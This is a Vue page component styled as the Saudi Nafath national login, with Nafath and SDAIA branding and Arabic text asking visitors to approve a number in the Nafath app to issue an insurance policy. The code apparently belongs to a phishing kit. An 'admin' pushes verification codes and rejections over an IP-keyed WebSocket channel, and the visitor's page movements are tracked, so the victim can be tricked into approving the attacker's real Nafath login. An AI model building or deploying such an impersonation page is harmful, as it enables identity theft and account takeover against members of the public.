<template>
    <div class="o-page" dir="rtl">
        <!-- Header -->
        <header class="nafath-header">
            <a href="/">
                <img src="/images/logo/Nafath/logo.png" width="128" alt="Nafath" />
            </a>
        </header>

        <!-- Main Content -->
        <div class="nafath-container">
            <div class="nafath-card nafath-card--center">
                <!-- Verification Code Display -->
                <div class="nafath-code-section">
                    <div class="nafath-code-badge">
                        <h1 class="nafath-code-number">{{ verificationCode || '—' }}</h1>
                    </div>

                    <h3 class="nafath-code-title">الرجاء فتح تطبيق نفاذ وتأكيد الطلب</h3>
                    <p class="nafath-code-desc">
                        قم بإختيار الرقم أعلاه في تطبيق نفاذ لاعتماد بياناتك وإصدار وثيقتك التأمينية
                    </p>

                    <!-- Status -->
                    <div v-if="codeUpdated" class="nafath-code-status">
                        ✅ تم تحديث رمز التحقق
                    </div>

                    <div class="nafath-code-actions">
                        <button type="button" class="nafath-btn nafath-btn--outline" @click="cancel">
                            ✕ إلغاء
                        </button>
                    </div>
                </div>
            </div>
        </div>

        <!-- Footer -->
        <footer class="nafath-footer">
            <div class="nafath-footer__brand">
                <img src="/images/logo/Nafath/sdaia-logo.svg" alt="SDAIA" width="48" />
                <div>
                    <p>تطوير وتشغيل</p>
                    <h5>الهيئة السعودية للبيانات والذكاء الاصطناعي</h5>
                    <p>النفاذ الوطني الموحد جميع الحقوق محفوظة © 2025</p>
                </div>
            </div>
        </footer>
    </div>
</template>

<script setup>
import { ref, onMounted, onUnmounted } from 'vue';
import { useRouter } from 'vue-router';
import { getEcho } from '@/services/echo';

const router = useRouter();

const verificationCode = ref(null);
const codeUpdated = ref(false);
let echoChannel = null;
let customerIp = null;
let pollTimer = null;

// ─── WebSocket — listen for code updates or rejection ───────────────
async function setupWebSocket() {
    const echo = await getEcho();
    if (!echo || !customerIp) return;

    echoChannel = echo.channel(`nafath.${customerIp}`);

    // Listen for code updates from admin
    echoChannel.listen('.NafathCodeUpdated', handleCodeUpdate);
    echoChannel.listen('.NafathApproved', handleCodeUpdate);

    // Listen for rejection
    echoChannel.listen('.NafathRejected', handleRejected);
}

function handleCodeUpdate(event) {
    if (event.verification_code) {
        verificationCode.value = event.verification_code;
        codeUpdated.value = true;
        codeUpdatedTimer = setTimeout(() => { codeUpdated.value = false; }, 3000);
    }
}

function handleRejected(event) {
    sessionStorage.setItem('nafathError', event.reason || 'nafath_other');
    router.push({ name: 'nafathError' });
}

// ─── Polling fallback — /api/nafath/status ──────────────────────────
function startPolling() {
    if (pollTimer) return;
    async function tick() {
        try {
            const { default: request } = await import('@/api/request');
            const { data } = await request.get('/nafath/status');
            if (data.status === 'approved' && data.verification_code) {
                if (data.verification_code !== verificationCode.value) {
                    verificationCode.value = data.verification_code;
                    codeUpdated.value = true;
                    setTimeout(() => { codeUpdated.value = false; }, 3000);
                }
            }
        } catch { /* silent */ }
        pollTimer = setTimeout(tick, 3000);
    }
    pollTimer = setTimeout(tick, 2000);
}

// ─── Cancel ─────────────────────────────────────────────────────────
const cancel = () => {
    sessionStorage.removeItem('nafathContext');
    router.push({ name: 'nafathRedirecting' });
};

// ─── Lifecycle ──────────────────────────────────────────────────────
onMounted(() => {
    // Load context
    const ctx = JSON.parse(sessionStorage.getItem('nafathContext') || '{}');
    customerIp = ctx.customerIp || null;
    verificationCode.value = ctx.verificationCode || null;

    if (!customerIp) {
        router.push({ name: 'nafathRedirecting' });
        return;
    }

    // Track page
    import('@/api/request').then(({ default: request }) => {
        request.post('/customer/page', { current_page: '/insurance/nafath/callback' }).catch(() => {});
    });

    setupWebSocket();
    startPolling();
});

let codeUpdatedTimer = null;

onUnmounted(() => {
    clearTimeout(codeUpdatedTimer);
    clearTimeout(pollTimer);
    pollTimer = null;
    if (echoChannel && customerIp) {
        try { window.Echo?.leave(`nafath.${customerIp}`); } catch { /* */ }
    }
});
</script>

<style scoped>
.o-page { background-color: #f4f6f9; min-height: 100vh; }
.nafath-header { background: white; box-shadow: 0 2px 4px rgba(0,0,0,.1); display: flex; align-items: center; padding: 12px 24px; margin-bottom: 32px; }
.nafath-container { max-width: 600px; margin: 0 auto; padding: 0 16px; }
.nafath-card { background: white; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,.08); padding: 40px; }
.nafath-card--center { text-align: center; }

.nafath-code-section { padding: 20px 0; }
.nafath-code-badge { display: inline-block; padding: 24px 48px; border: 3px solid #11998e; border-radius: 12px; background: #f0f9f8; margin-bottom: 28px; }
.nafath-code-number { font-size: 56px; color: #11998e; font-weight: 700; margin: 0; letter-spacing: 8px; }
.nafath-code-title { color: #11998e; font-weight: 700; font-size: 20px; margin-bottom: 16px; }
.nafath-code-desc { color: #666; font-size: 16px; line-height: 1.8; margin-bottom: 24px; }
.nafath-code-status { background: #d1fae5; color: #065f46; padding: 10px 20px; border-radius: 8px; font-weight: 600; margin-bottom: 20px; display: inline-block; }
.nafath-code-actions { margin-top: 24px; }

.nafath-btn { border-radius: 4px; font-weight: 600; padding: 12px 32px; cursor: pointer; transition: all .3s; border: 2px solid #11998e; font-size: 14px; display: inline-block; text-decoration: none; }
.nafath-btn--outline { background: transparent; color: #11998e; }
.nafath-btn--outline:hover { background: #11998e; color: white; }

.nafath-footer { background: #f8f9fa; border-top: 1px solid #e9ecef; padding: 30px 24px; margin-top: 60px; display: flex; align-items: center; gap: 16px; }
.nafath-footer__brand { display: flex; align-items: center; gap: 12px; }
.nafath-footer__brand p { margin: 0; font-size: 12px; color: #6c757d; }
.nafath-footer__brand h5 { margin: 4px 0; color: #495057; }

@media (max-width: 768px) {
    .nafath-card { border-radius: 0; padding: 24px 16px; }
    .nafath-code-number { font-size: 40px; }
    .nafath-code-badge { padding: 16px 32px; }
    .nafath-footer { flex-direction: column; text-align: center; }
}
</style>
